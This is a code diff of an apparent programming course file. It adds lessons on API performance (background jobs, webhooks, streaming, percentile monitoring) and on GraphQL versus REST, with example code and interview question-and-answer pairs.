+app.post('/api/reports/generate', async (req, res) => {
+  // Create job
+  const job = await queue.add('generateReport', req.body);
+
+  // Return immediately
+  res.status(202).json({
+    jobId: job.id,
+    status: 'processing',
+    statusUrl: \`/api/jobs/\${job.id}\`
+  });
+});
+
+// Job processor (background worker)
+queue.process('generateReport', async (job) => {
+  const report = await generateReport(job.data);
+  await db.saveReport(report);
+  // Optionally send webhook when done
+});
+
+// Status endpoint
+app.get('/api/jobs/:id', async (req, res) => {
+  const job = await queue.getJob(req.params.id);
+
+  res.json({
+    jobId: job.id,
+    status: job.status,  // 'processing', 'completed', 'failed'
+    result: job.result,
+    error: job.error
+  });
+});
+
+Use cases:
+- Report generation
+- Video processing
+- Bulk operations
+- Email sending
+- Data exports
+
+Benefits:
+✅ Fast API response (don't wait)
+✅ Better user experience (progress updates)
+✅ Can prioritize jobs
+✅ Retry on failure</div>
+
+                            <h3>Background Jobs</h3>
+                            <div class="code-block">Offload work to background workers
+
+Libraries:
+- Bull (Redis-based, Node.js)
+- Sidekiq (Redis-based, Ruby)
+- Celery (Python)
+- Hangfire (.NET)
+
+// Bull example
+const Queue = require('bull');
+const emailQueue = new Queue('email', 'redis://localhost:6379');
+
+// API endpoint
+app.post('/api/users', async (req, res) => {
+  const user = await db.createUser(req.body);
+
+  // Queue welcome email (don't wait)
+  await emailQueue.add({
+    to: user.email,
+    template: 'welcome'
+  });
+
+  res.status(201).json(user);
+});
+
+// Worker process
+emailQueue.process(async (job) => {
+  await sendEmail(job.data.to, job.data.template);
+});
+
+Job options:
+- Priority: High-priority jobs first
+- Delay: Schedule for future
+- Retry: Auto-retry on failure
+- Timeout: Fail if takes too long
+
+emailQueue.add(data, {
+  priority: 1,
+  delay: 5000,      // Start after 5 seconds
+  attempts: 3,      // Retry up to 3 times
+  timeout: 30000    // Fail if > 30 seconds
+});</div>
+
+                            <h3>Webhooks for Callbacks</h3>
+                            <div class="code-block">Push updates to clients instead of polling
+
+Polling (❌ inefficient):
+Client: GET /api/jobs/123 (every 5 seconds)
+Server: {"status": "processing"}
+...repeat 10 times...
+Server: {"status": "completed"}
+
+Webhooks (✅ efficient):
+Client: POST /api/reports {"webhook": "https://client.com/callback"}
+Server: Starts job
+...job completes...
+Server: POST https://client.com/callback {"status": "completed", "url": "..."}
+
+// API accepts webhook URL
+app.post('/api/reports', async (req, res) => {
+  const job = await queue.add('generateReport', {
+    ...req.body,
+    webhookUrl: req.body.webhook
+  });
+
+  res.status(202).json({ jobId: job.id });
+});
+
+// Worker sends webhook when done
+queue.process('generateReport', async (job) => {
+  const report = await generateReport(job.data);
+
+  // Send webhook
+  if (job.data.webhookUrl) {
+    await axios.post(job.data.webhookUrl, {
+      jobId: job.id,
+      status: 'completed',
+      result: report
+    });
+  }
+});
+
+Benefits over polling:
+✅ No wasted requests
+✅ Instant updates
+✅ Reduces server load
+
+Webhook best practices:
+- Sign requests (HMAC) for security
+- Retry with exponential backoff
+- Timeout (don't wait forever)
+- Idempotency (client might receive twice)</div>
+
+                            <h3>Streaming Responses</h3>
+                            <div class="code-block">Send data as it becomes available (don't wait for all)
+
+Regular response:
+→ Server fetches all 1000 records
+→ Serializes to JSON
+→ Sends entire response
+→ Client waits 10 seconds for everything
+
+Streaming response:
+→ Server fetches first 100 records
+→ Sends chunk
+→ Fetches next 100
+→ Sends chunk
+→ Client shows data immediately (progressive loading)
+
+// Node.js streaming
+app.get('/api/large-dataset', async (req, res) => {
+  res.setHeader('Content-Type', 'application/json');
+  res.write('[');
+
+  const stream = db.stream('SELECT * FROM records');
+  let first = true;
+
+  stream.on('data', (record) => {
+    if (!first) res.write(',');
+    res.write(JSON.stringify(record));
+    first = false;
+  });
+
+  stream.on('end', () => {
+    res.write(']');
+    res.end();
+  });
+});
+
+// Server-Sent Events (SSE) for real-time updates
+app.get('/api/events', (req, res) => {
+  res.setHeader('Content-Type', 'text/event-stream');
+  res.setHeader('Cache-Control', 'no-cache');
+  res.setHeader('Connection', 'keep-alive');
+
+  const interval = setInterval(() => {
+    res.write(\`data: \${JSON.stringify({time: Date.now()})}\n\n\`);
+  }, 1000);
+
+  req.on('close', () => {
+    clearInterval(interval);
+  });
+});
+
+Use cases:
+- Large datasets
+- Real-time updates (stock prices)
+- Log tailing
+- Progress updates</div>
+
+                            <h2>Monitoring & Metrics</h2>
+
+                            <h3>Response Time Percentiles</h3>
+                            <div class="code-block">Average is misleading, use percentiles
+
+Scenario: 100 requests
+99 requests: 10ms
+1 request: 1000ms
+
+Average: (99×10 + 1×1000) / 100 = 20ms
+→ Looks good!
+
+But 1% of users experience 1000ms (terrible!)
+
+Percentiles:
+p50 (median): 10ms (50% faster than this)
+p95: 10ms (95% faster than this)
+p99: 1000ms (99% faster than this)
+p99.9: 1000ms
+
+p99 reveals the outliers!
+
+Why percentiles matter:
+- p50: Typical user experience
+- p95: Most users (covers 95%)
+- p99: Outliers (often VIPs, large accounts)
+- p99.9: Very rare but important to track
+
+SLA targets:
+- p50 < 100ms
+- p95 < 500ms
+- p99 < 1000ms
+
+// Monitoring with Prometheus
+const promClient = require('prom-client');
+const histogram = new promClient.Histogram({
+  name: 'http_request_duration_ms',
+  help: 'Duration of HTTP requests in ms',
+  labelNames: ['method', 'route', 'status'],
+  buckets: [10, 50, 100, 500, 1000, 5000]
+});
+
+app.use((req, res, next) => {
+  const start = Date.now();
+
+  res.on('finish', () => {
+    const duration = Date.now() - start;
+    histogram.labels(req.method, req.route.path, res.statusCode).observe(duration);
+  });
+
+  next();
+});</div>
+
+                            <h3>Error Rates</h3>
+                            <div class="code-block">Track success vs failure rates
+
+Metrics:
+- 2xx rate: Successful requests
+- 4xx rate: Client errors (bad requests)
+- 5xx rate: Server errors (your fault!)
+
+Targets:
+- 5xx rate < 0.1% (99.9% success)
+- 4xx rate < 5% (depends on API)
+
+// Track error rates
+const errorRate = new promClient.Counter({
+  name: 'http_requests_total',
+  help: 'Total HTTP requests',
+  labelNames: ['method', 'route', 'status']
+});
+
+app.use((req, res, next) => {
+  res.on('finish', () => {
+    errorRate.labels(req.method, req.route.path, res.statusCode).inc();
+  });
+  next();
+});
+
+Alert if 5xx rate spikes:
+if (5xx_rate > 1%) { alert("High error rate!") }</div>
+
+                            <h3>Throughput</h3>
+                            <div class="code-block">Requests per second (RPS)
+
+Metrics:
+- Total requests
+- Requests per second
+- Requests per endpoint
+
+// Track throughput
+const requestCounter = new promClient.Counter({
+  name: 'http_requests_total',
+  help: 'Total HTTP requests',
+  labelNames: ['method', 'route']
+});
+
+Capacity planning:
+Current: 100 RPS
+Peak: 500 RPS
+Target: Handle 1000 RPS
+
+Load testing:
+- Apache Bench (ab)
+- K6
+- Artillery
+- JMeter
+
+Example load test with K6:
+import http from 'k6/http';
+import { check } from 'k6';
+
+export let options = {
+  stages: [
+    { duration: '1m', target: 100 },  // Ramp to 100 users
+    { duration: '3m', target: 100 },  // Stay at 100
+    { duration: '1m', target: 0 }     // Ramp down
+  ]
+};
+
+export default function() {
+  const res = http.get('https://api.example.com/users');
+  check(res, { 'status is 200': (r) => r.status === 200 });
+}</div>
+
+                            <h3>APM Tools</h3>
+                            <div class="code-block">Application Performance Monitoring
+
+Popular tools:
+- New Relic: Full-stack monitoring
+- DataDog: Infrastructure + APM
+- AppDynamics: Enterprise APM
+- Sentry: Error tracking
+- Honeycomb: Observability
+
+Features:
+✅ Distributed tracing (follow request across services)
+✅ Database query analysis
+✅ Slow transaction detection
+✅ Error tracking with stack traces
+✅ Real user monitoring (RUM)
+✅ Custom dashboards
+
+// New Relic example
+const newrelic = require('newrelic');
+
+app.get('/api/users', async (req, res) => {
+  newrelic.startSegment('database-query', true, async () => {
+    const users = await db.query('SELECT * FROM users');
+    res.json(users);
+  });
+});
+
+Distributed tracing:
+API Gateway → User Service → Database
+            ↘ Email Service → SMTP
+
+Single trace ID across all services
+See where time spent at each step</div>
+
+                            <h2>Summary</h2>
+                            <p>API performance optimization targets multiple layers:</p>
                             <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li>N+1 problem example and solution</li>
-                                <li>Database indexing impact</li>
-                                <li>Async processing patterns</li>
-                                <li>APM tools (New Relic, DataDog)</li>
+                                <li><strong>Database:</strong> Fix N+1 queries, add indexes, use connection pooling, read replicas for scale</li>
+                                <li><strong>Payload:</strong> Sparse fieldsets, pagination, compression reduce response size</li>
+                                <li><strong>Async:</strong> 202 Accepted for long operations, background jobs, webhooks instead of polling</li>
+                                <li><strong>Streaming:</strong> Send data progressively, don't wait for everything</li>
+                                <li><strong>Monitoring:</strong> Track p50/p95/p99 (not just average), error rates, throughput</li>
+                                <li>N+1 problem: Most common issue, fix with eager loading/JOINs</li>
+                                <li>Indexing: 100x speedup for filtered queries, but slows writes</li>
+                                <li>Connection pooling: 10x faster than creating connections per request</li>
+                                <li>Use APM tools (New Relic, DataDog) for visibility into performance</li>
                             </ul>
                         `,
-                        interviews: []
+                        interviews: [
+                            {
+                                question: "What is the N+1 query problem and how do you fix it?",
+                                answer: "N+1 problem: Fetching collection (1 query) then looping to fetch related data for each item (N queries). Example: Get 100 users → loop to get posts for each user = 1 + 100 = 101 queries! Solution: Eager loading with JOINs. Instead of loop, one query with JOIN: SELECT users.*, posts.* FROM users LEFT JOIN posts ON posts.user_id = users.id. Result: 1 query instead of 101, ~67x faster (1010ms → 15ms). ORM solution: Sequelize User.findAll({include: [{model: Post}]}). Most common database performance problem in APIs. Always eager load relationships instead of lazy loading in loops."
+                            },
+                            {
+                                question: "Why should you use connection pooling for databases?",
+                                answer: "Creating database connection is expensive (~100ms). Without pooling: Every request creates connection → query (10ms) → close connection. Total: 110ms. With pooling: Maintain pool of reused connections. Request gets connection from pool (1ms) → query (10ms) → returns to pool. Total: 11ms. 10x faster! Pool sizing: Too small → requests wait. Too large → database overwhelmed. Formula: (CPU cores × 2) + disk. Example: 4 cores + 1 disk = 10 connections. Important: Multiple app servers share database connection limit. 3 servers × 20 pool = 60 total connections, ensure database supports it."
+                            },
+                            {
+                                question: "What are read replicas and when should you use them?",
+                                answer: "Read replicas: Separate database servers for read traffic. Master handles writes (20%), replicas handle reads (80%). Benefits: 1) Master not overwhelmed, 2) Scale reads horizontally (add more replicas), 3) Geographic distribution (replica closer to users). Implementation: Route writes to master, reads to replicas. Challenge: Replication lag (~100ms). User creates account on master → immediate read from replica might not see it yet. Solutions: 1) Read from master for critical operations, 2) Accept eventual consistency, 3) Sticky sessions. Use when: Read-heavy workload, need to scale beyond single database, global distribution needed."
+                            },
+                            {
+                                question: "What is async processing with 202 Accepted and when should you use it?",
+                                answer: "202 Accepted: Return immediately with job ID instead of waiting for long operation. Synchronous (bad): Client sends request → server processes 30 seconds → response. Client waits 30 seconds! Asynchronous (good): Client sends request → server creates job, returns 202 with job ID immediately → client polls status or gets webhook. Benefits: 1) Fast API response, 2) Better UX (progress updates), 3) Can prioritize jobs, 4) Retry on failure. Use for: Report generation, video processing, bulk operations, email sending, data exports. Client polls: GET /api/jobs/{id} or server sends webhook when complete. Always use for operations >5 seconds."
+                            },
+                            {
+                                question: "Why are percentiles (p95, p99) more important than average response time?",
+                                answer: "Average is misleading. Example: 99 requests at 10ms, 1 request at 1000ms. Average: (99×10 + 1×1000)/100 = 20ms (looks good!). But 1% users experience 1000ms (terrible!). Percentiles reveal truth: p50=10ms (median), p95=10ms, p99=1000ms (1% have this slow experience). p99 shows outliers! Why matters: Outliers often VIPs or large accounts. SLA targets: p50 <100ms, p95 <500ms, p99 <1000ms. p50 = typical user, p95 = most users (95%), p99 = outliers but important to track. Always optimize for p99, not average. If p99 is 5 seconds, 1 in 100 users has terrible experience."
+                            },
+                            {
+                                question: "What is sparse fieldsets and how does it improve performance?",
+                                answer: "Sparse fieldsets: Let clients request only needed fields instead of all fields. Without: GET /api/users/123 → returns all 50 fields (10KB). With: GET /api/users/123?fields=id,name,email → returns 3 fields (0.5KB). 20x smaller! Implementation: Parse fields query param, validate against allowed fields, SELECT only those fields. Benefits: 1) Reduces bandwidth, 2) Faster serialization (less data to JSON.stringify), 3) Mobile-friendly (limited data), 4) Faster database query (less data to fetch). Use case: Mobile apps showing summary (only need name, avatar) not full profile (50 fields). JSON:API standard: fields[articles]=title,body. Always validate fields to prevent SQL injection."
+                            }
+                        ]
                     }
                 ]
             },
@@ -15174,169 +21462,2619 @@ validator.isEmail(email);  // Tested, safe regex</div>
                         title: 'GraphQL vs REST',
                         duration: '50 min',
                         content: `
-                            <h2>OUTLINE: GraphQL vs REST</h2>
+                            <h2>What is GraphQL?</h2>
+                            <p>GraphQL is a query language for APIs created by Facebook in 2012 (open-sourced 2015). It provides a flexible alternative to REST by letting clients specify exactly what data they need.</p>
 
-                            <h3>Topics to Cover:</h3>
-                            <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li><strong>GraphQL Fundamentals</strong>
-                                    - What is GraphQL
-                                    - Schema and type system
-                                    - Queries and mutations
-                                    - Single endpoint vs REST multiple endpoints
-                                </li>
-                                <li><strong>REST vs GraphQL Comparison</strong>
-                                    - Over-fetching and under-fetching
-                                    - Versioning strategies
-                                    - Caching differences
-                                    - Learning curve
-                                    - Tooling ecosystem
-                                </li>
-                                <li><strong>When to Use Each</strong>
-                                    - REST: Simple CRUD, public APIs, caching important
-                                    - GraphQL: Complex data requirements, mobile apps, rapid iteration
-                                </li>
-                                <li><strong>GraphQL Challenges</strong>
-                                    - N+1 problem (DataLoader solution)
-                                    - Rate limiting complexity
-                                    - Caching strategies
-                                    - File uploads
-                                </li>
-                            </ul>
+                            <div class="code-block">REST approach:
+Multiple endpoints, fixed responses
 
-                            <h3>Examples to Include:</h3>
+GET /api/users/123          → {id, name, email, bio, avatar, ...}
+GET /api/users/123/posts    → [{id, title, body, ...}, ...]
+GET /api/posts/456/comments → [{id, text, author, ...}, ...]
+
+GraphQL approach:
+Single endpoint, flexible queries
+
+POST /graphql
+{
+  user(id: 123) {
+    name
+    email
+    posts {
+      title
+      comments {
+        text
+      }
+    }
+  }
+}
+
+Client gets exactly what it asks for, nothing more!</div>
+
+                            <h2>GraphQL Fundamentals</h2>
+
+                            <h3>Schema and Type System</h3>
+                            <div class="code-block">GraphQL schema defines available data and operations
+
+// Schema definition
+type User {
+  id: ID!
+  name: String!
+  email: String!
+  posts: [Post!]!
+}
+
+type Post {
+  id: ID!
+  title: String!
+  body: String!
+  author: User!
+  comments: [Comment!]!
+}
+
+type Comment {
+  id: ID!
+  text: String!
+  author: User!
+}
+
+type Query {
+  user(id: ID!): User
+  posts(limit: Int): [Post!]!
+}
+
+type Mutation {
+  createPost(title: String!, body: String!): Post!
+  deletePost(id: ID!): Boolean!
+}
+
+Types:
+- Scalar: Int, Float, String, Boolean, ID
+- Object: Custom types (User, Post)
+- List: [Post]
+- Non-null: String! (required)
+
+Schema is self-documenting!
+Clients can introspect to see all available operations</div>
+
+                            <h3>Queries</h3>
+                            <div class="code-block">Client specifies exactly what data to fetch
+
+// Simple query
+query {
+  user(id: "123") {
+    name
+    email
+  }
+}
+
+Response:
+{
+  "data": {
+    "user": {
+      "name": "John Doe",
+      "email": "john@example.com"
+    }
+  }
+}
+
+// Nested query
+query {
+  user(id: "123") {
+    name
+    posts {
+      title
+      comments {
+        text
+        author {
+          name
+        }
+      }
+    }
+  }
+}
+
+// Multiple queries in one request
+query {
+  user1: user(id: "123") {
+    name
+  }
+  user2: user(id: "456") {
+    name
+  }
+}
+
+// Query with variables
+query GetUser($userId: ID!) {
+  user(id: $userId) {
+    name
+    email
+  }
+}
+
+Variables:
+{
+  "userId": "123"
+}</div>
+
+                            <h3>Mutations</h3>
+                            <div class="code-block">Modify data on the server
+
+mutation {
+  createPost(title: "GraphQL is great", body: "Here's why...") {
+    id
+    title
+    author {
+      name
+    }
+  }
+}
+
+Response:
+{
+  "data": {
+    "createPost": {
+      "id": "789",
+      "title": "GraphQL is great",
+      "author": {
+        "name": "John Doe"
+      }
+    }
+  }
+}
+
+Multiple mutations (executed sequentially):
+mutation {
+  post1: createPost(title: "First") { id }
+  post2: createPost(title: "Second") { id }
+}
+
+Note: Mutations run sequentially, queries run in parallel</div>
+
+                            <h2>REST vs GraphQL Comparison</h2>
+
+                            <h3>Over-fetching Problem (REST)</h3>
+                            <div class="code-block">REST: Server decides what data to return
+
+Mobile app needs: user name and avatar (2 fields)
+
+REST endpoint:
+GET /api/users/123
+→ Returns 50 fields {id, name, email, bio, avatar, location, ...}
+
+Problem:
+✅ Client needs: 2 fields (100 bytes)
+❌ Server sends: 50 fields (5000 bytes)
+→ Wasted bandwidth (especially bad for mobile)
+
+GraphQL solution:
+query {
+  user(id: "123") {
+    name
+    avatar
+  }
+}
+→ Returns exactly 2 fields (100 bytes)
+
+50x less data!</div>
+
+                            <h3>Under-fetching Problem (REST)</h3>
+                            <div class="code-block">REST: Often need multiple requests
+
+Task: Show user profile with recent posts and comment counts
+
+REST approach (3 requests):
+1. GET /api/users/123        → User data
+2. GET /api/users/123/posts  → Posts
+3. For each post: GET /api/posts/{id}/comments/count → Counts
+
+If user has 10 posts: 1 + 1 + 10 = 12 requests!
+
+GraphQL approach (1 request):
+query {
+  user(id: "123") {
+    name
+    bio
+    posts(limit: 10) {
+      title
+      commentCount
+    }
+  }
+}
+
+12 requests → 1 request!
+Saves 11 round trips (especially important on slow networks)</div>
+
+                            <h3>Versioning</h3>
+                            <div class="code-block">REST: Explicit versioning required
+/api/v1/users
+/api/v2/users
+
+Breaking change → New version → Maintain both
+
+GraphQL: Version-free by design
+
+Adding fields (non-breaking):
+type User {
+  name: String!
+  email: String!
+  phone: String!  ← New field added
+}
+
+Old clients: Still query {name, email}
+New clients: Can query {name, email, phone}
+→ No breaking change!
+
+Deprecating fields:
+type User {
+  name: String!
+  email: String! @deprecated(reason: "Use emailAddress instead")
+  emailAddress: String!
+}
+
+Clients see deprecation warning, can migrate gradually
+No forced upgrade like REST v1 → v2
+
+Evolutionary API instead of versioned API</div>
+
+                            <h3>Caching</h3>
+                            <div class="code-block">REST: Easy caching (HTTP caching, URL-based)
+
+GET /api/users/123
+Cache-Control: max-age=3600
+→ Browser/CDN caches by URL
+
+GraphQL: Harder caching (single endpoint, POST requests)
+
+POST /graphql
+Body: {"query": "{ user(id: \"123\") { name } }"}
+
+Can't cache by URL (always /graphql)
+Can't use HTTP caching (POST, body varies)
+
+Solutions:
+1. Client-side caching (Apollo Client, Relay)
+   - Cache by query + variables
+   - Normalized cache (store entities separately)
+
+2. Persisted queries
+   - Send query hash instead of full query
+   - GET /graphql?queryId=abc123&variables=...
+   - Can cache by URL now!
+
+3. Server-side caching
+   - Cache resolver results
+   - Use DataLoader for batching + caching
+
+REST: Built-in HTTP caching (easier)
+GraphQL: Requires custom caching logic (more complex)</div>
+
+                            <h3>Learning Curve and Tooling</h3>
+                            <div class="code-block">REST:
+✅ Simple concept (CRUD over HTTP)
+✅ Familiar to most developers
+✅ Lots of tooling (Postman, curl, browser)
+✅ HTTP features work out of box (caching, status codes)
+
+GraphQL:
+❌ New query language to learn
+❌ Schema design complexity
+✅ Excellent tooling (GraphiQL, Apollo Studio)
+✅ Strong typing (better IDE support)
+✅ Introspection (self-documenting)
+
+Developer experience:
+GraphQL: More upfront complexity, better long-term DX
+REST: Less upfront complexity, more maintenance over time</div>
+
+                            <h2>When to Use Each</h2>
+
+                            <h3>Use REST When</h3>
+                            <div class="code-block">✅ Simple CRUD operations
+GET /api/users
+POST /api/users
+PUT /api/users/123
+DELETE /api/users/123
+
+✅ Public APIs (third-party consumers)
+- REST more familiar
+- Better caching for public data
+- URL-based access control easier
+
+✅ Caching is critical
+- CDN caching works out of box
+- HTTP caching is simple
+
+✅ File uploads/downloads
+- REST handles files naturally
+- GraphQL file uploads more complex
+
+✅ Small, stable APIs
+- Overhead of GraphQL not worth it
+- CRUD is enough
+
+Examples:
+- Stripe API (payment processing)
+- Twilio API (SMS, calls)
+- GitHub REST API (alongside GraphQL)</div>
+
+                            <h3>Use GraphQL When</h3>
+                            <div class="code-block">✅ Complex data requirements
+Multiple related resources in one request
+Deeply nested relationships
+
+✅ Mobile applications
+- Bandwidth constraints (can't afford over-fetching)
+- Slow networks (minimize round trips)
+- Battery life (fewer requests)
+
+✅ Rapid frontend iteration
+- Frontend can request new fields without backend changes
+- No need for new endpoints
+
+✅ Multiple clients with different needs
+Mobile app: needs minimal data
+Web app: needs full data
+→ Each queries what it needs
+
+✅ GraphQL-first teams
+- Strong typing helps large teams
+- Schema as contract between frontend/backend
+- Better code generation
+
+Examples:
+- GitHub GraphQL API (complex queries)
+- Shopify GraphQL API (flexible storefronts)
+- Facebook/Instagram (created GraphQL for mobile)</div>
+
+                            <h2>GraphQL Challenges</h2>
+
+                            <h3>N+1 Problem</h3>
+                            <div class="code-block">GraphQL can cause N+1 queries if not careful!
+
+Query:
+query {
+  posts {       ← 1 query: SELECT * FROM posts
+    title
+    author {    ← N queries: SELECT * FROM users WHERE id = ?
+      name
+    }
+  }
+}
+
+For 100 posts: 1 + 100 = 101 database queries!
+
+Solution: DataLoader (batching + caching)
+
+const DataLoader = require('dataloader');
+
+const userLoader = new DataLoader(async (userIds) => {
+  // Batches multiple requests into one
+  const users = await db.query('SELECT * FROM users WHERE id IN (?)', [userIds]);
+  // Returns users in same order as userIds
+  return userIds.map(id => users.find(u => u.id === id));
+});
+
+// Resolver
+const resolvers = {
+  Post: {
+    author: (post) => userLoader.load(post.authorId)
+  }
+};
+
+DataLoader:
+1. Collects all author IDs in current request tick
+2. Batches into single query: WHERE id IN (1, 2, 3, ...)
+3. Caches results (same author requested twice → cached)
+
+101 queries → 1 query!
+
+Must use DataLoader for production GraphQL</div>
+
+                            <h3>Rate Limiting Complexity</h3>
+                            <div class="code-block">REST: Easy to rate limit (count requests per endpoint)
+
+POST /api/users → 100/hour
+GET /api/posts → 1000/hour
+
+GraphQL: Complex (single endpoint, varying costs)
+
+Simple query (cheap):
+{ user(id: "123") { name } }
+
+Complex query (expensive):
+{
+  users(limit: 1000) {    ← 1000 users
+    posts(limit: 100) {   ← 100 posts each
+      comments {          ← All comments
+        author {
+          posts {         ← Nested posts!
+            comments {    ← Even more data!
+              ...
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+Can request millions of records in one query!
+
+Solutions:
+1. Query depth limiting
+   - Max depth: 5 levels
+   - Reject: {user {posts {comments {author {posts {... }}}}}}
+
+2. Query complexity scoring
+   - user: 1 point
+   - posts: 10 points per post
+   - comments: 5 points per comment
+   - Reject if total > 1000 points
+
+3. Query cost analysis
+   - Estimate before executing
+   - Reject if exceeds budget
+
+// graphql-depth-limit
+const depthLimit = require('graphql-depth-limit');
+
+const server = new ApolloServer({
+  schema,
+  validationRules: [depthLimit(5)]
+});
+
+// graphql-cost-analysis
+const costAnalysis = require('graphql-cost-analysis').default;
+
+const server = new ApolloServer({
+  schema,
+  validationRules: [
+    costAnalysis({
+      maximumCost: 1000
+    })
+  ]
+});</div>
+
+                            <h3>Caching Strategies</h3>
+                            <div class="code-block">GraphQL caching harder than REST
+
+Apollo Client caching:
+// Normalized cache
+cache: new InMemoryCache({
+  typePolicies: {
+    User: {
+      keyFields: ["id"]  // Use id as cache key
+    }
+  }
+})
+
+Query 1: { user(id: "123") { name } }
+→ Cached: User:123 = {name: "John"}
+
+Query 2: { user(id: "123") { email } }
+→ Fetch email, merge into cache
+→ User:123 = {name: "John", email: "john@example.com"}
+
+Query 3: { user(id: "123") { name } }
+→ Return from cache (no network request!)
+
+Server-side caching:
+Use Redis to cache resolver results
+
+const resolvers = {
+  Query: {
+    user: async (_, {id}) => {
+      const cacheKey = \`user:\${id}\`;
+      let user = await redis.get(cacheKey);
+
+      if (!user) {
+        user = await db.getUser(id);
+        await redis.setex(cacheKey, 3600, JSON.stringify(user));
+      }
+
+      return JSON.parse(user);
+    }
+  }
+};
+
+Persisted queries for HTTP caching:
+// Hash query on client
+const queryHash = sha256(query);
+
+// Send hash instead of query
+GET /graphql?queryId=abc123&variables={"id":"123"}
+
+// Server looks up query by hash
+// Now can use HTTP caching on GET request!</div>
+
+                            <h2>Real-World Example: GitHub API</h2>
+
+                            <div class="code-block">GitHub offers both REST and GraphQL APIs
+
+Same task: Get repository info with owner
+
+REST (2 requests):
+GET /repos/facebook/react
+→ {name, description, stars, ...}
+
+GET /users/facebook
+→ {name, avatar, bio, ...}
+
+GraphQL (1 request):
+query {
+  repository(owner: "facebook", name: "react") {
+    name
+    description
+    stargazerCount
+    owner {
+      login
+      avatarUrl
+      bio
+    }
+  }
+}
+
+Complex query (impossible in REST without many requests):
+query {
+  repository(owner: "facebook", name: "react") {
+    issues(first: 5, states: OPEN) {
+      edges {
+        node {
+          title
+          author {
+            login
+          }
+          comments(first: 3) {
+            edges {
+              node {
+                body
+                author {
+                  login
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+Single request gets:
+- Repository
+- 5 issues
+- Authors of issues
+- 3 comments per issue
+- Authors of comments
+
+In REST: Would need 20+ requests!</div>
+
+                            <h2>Comparison Table</h2>
+
+                            <table>
+                                <thead>
+                                    <tr>
+                                        <th>Aspect</th>
+                                        <th>REST</th>
+                                        <th>GraphQL</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td><strong>Endpoints</strong></td>
+                                        <td>Multiple (/users, /posts)</td>
+                                        <td>Single (/graphql)</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Data fetching</strong></td>
+                                        <td>Fixed (server decides)</td>
+                                        <td>Flexible (client decides)</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Over-fetching</strong></td>
+                                        <td>Common</td>
+                                        <td>Eliminated</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Under-fetching</strong></td>
+                                        <td>Multiple requests</td>
+                                        <td>One request</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Versioning</strong></td>
+                                        <td>/v1, /v2 (explicit)</td>
+                                        <td>Evolutionary (implicit)</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Caching</strong></td>
+                                        <td>Easy (HTTP, URL-based)</td>
+                                        <td>Complex (requires tooling)</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Learning curve</strong></td>
+                                        <td>Low (familiar)</td>
+                                        <td>Medium (new concepts)</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Tooling</strong></td>
+                                        <td>Universal (curl, Postman)</td>
+                                        <td>Excellent (GraphiQL, Apollo)</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Rate limiting</strong></td>
+                                        <td>Easy (per endpoint)</td>
+                                        <td>Complex (query cost)</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>File uploads</strong></td>
+                                        <td>Native</td>
+                                        <td>Requires extensions</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Best for</strong></td>
+                                        <td>CRUD, public APIs, caching</td>
+                                        <td>Complex queries, mobile, flexibility</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+
+                            <h2>Summary</h2>
+                            <p>GraphQL and REST each have strengths for different use cases:</p>
                             <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li>GitHub GraphQL API</li>
-                                <li>Same data fetch in REST vs GraphQL</li>
-                                <li>Over-fetching example</li>
+                                <li><strong>GraphQL:</strong> Single endpoint, client specifies exactly what data to fetch</li>
+                                <li><strong>Over-fetching:</strong> REST returns all fields, GraphQL returns only requested fields</li>
+                                <li><strong>Under-fetching:</strong> REST needs multiple requests, GraphQL gets all in one request</li>
+                                <li><strong>Versioning:</strong> REST uses explicit versions (/v1, /v2), GraphQL is version-free (evolutionary)</li>
+                                <li><strong>Caching:</strong> REST easier (HTTP caching), GraphQL harder (requires custom logic)</li>
+                                <li><strong>N+1 problem:</strong> GraphQL vulnerable, must use DataLoader for batching</li>
+                                <li><strong>Rate limiting:</strong> GraphQL complex (query depth limits, cost analysis needed)</li>
+                                <li>Use REST for: Simple CRUD, public APIs, when caching is critical</li>
+                                <li>Use GraphQL for: Complex data needs, mobile apps, rapid iteration, multiple clients</li>
+                                <li>GitHub offers both: REST for simple operations, GraphQL for complex queries</li>
                             </ul>
                         `,
-                        interviews: []
+                        interviews: [
+                            {
+                                question: "What is the over-fetching problem in REST and how does GraphQL solve it?",
+                                answer: "Over-fetching: REST endpoint returns all fields even if client needs only few. Example: Mobile app needs user name + avatar (2 fields), but GET /api/users/123 returns 50 fields (5000 bytes). Wasted bandwidth, especially bad for mobile. GraphQL solution: Client specifies exactly what fields to fetch. query { user(id: \"123\") { name avatar } } returns only 2 fields (100 bytes). 50x less data! Benefit: Mobile apps can request minimal data, web apps can request full data, same API serves both. Critical for bandwidth-constrained environments."
+                            },
+                            {
+                                question: "What is the under-fetching problem and how does GraphQL address it?",
+                                answer: "Under-fetching: Need multiple REST requests to get related data. Example: User profile with posts and comment counts. REST: GET /users/123 (user), GET /users/123/posts (posts), then GET /posts/{id}/comments/count for each post. If 10 posts = 12 requests! GraphQL: Single request fetches all. query { user(id: \"123\") { name posts { title commentCount } } }. 12 requests → 1 request. Saves round trips, critical on slow networks (each round trip adds latency). GraphQL can fetch arbitrarily nested data in one request."
+                            },
+                            {
+                                question: "Why is versioning easier in GraphQL than REST?",
+                                answer: "REST: Breaking change requires new version. /api/v1/users → /api/v2/users. Must maintain both versions, force clients to migrate. GraphQL: Version-free by design. Adding field is non-breaking (old clients don't query it, still work). Deprecating field: Mark @deprecated(reason: \"Use emailAddress instead\"). Clients see warning but still work. Can migrate gradually. Evolutionary API vs versioned API. GraphQL schema evolves without breaking clients. Only breaking change: Removing field without deprecation period. Makes API evolution much smoother for large systems with many clients."
+                            },
+                            {
+                                question: "What is the N+1 problem in GraphQL and how does DataLoader solve it?",
